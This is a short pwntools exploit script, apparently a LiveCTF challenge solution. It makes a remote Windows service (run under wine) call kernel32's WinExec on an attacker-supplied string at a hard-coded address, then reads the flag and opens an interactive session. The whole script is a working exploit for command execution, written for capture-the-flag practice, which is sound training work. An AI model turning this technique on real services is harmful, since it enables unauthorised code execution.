from pwn import *

PAYLOAD = b"WinExec" + b"\x00" + b"/home/livectf/submitter\x00"
ADDR = 0x7ffffe2ffd40  + len(b"WinExec") + 1
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337  
p = remote(HOST, PORT)
# p = process(["wine", "./challenge.exe"])
  
p.sendlineafter(b"Which module would you like to load?", b"kernel32.dll")
# input()
p.sendlineafter(b"What function do you want to call?", PAYLOAD)
p.sendlineafter(b"What value do you want for the first argument?", str(ADDR).encode())
warning('%s', p.recvline_contains(b'LiveCTF{').decode().strip())
p.interactive()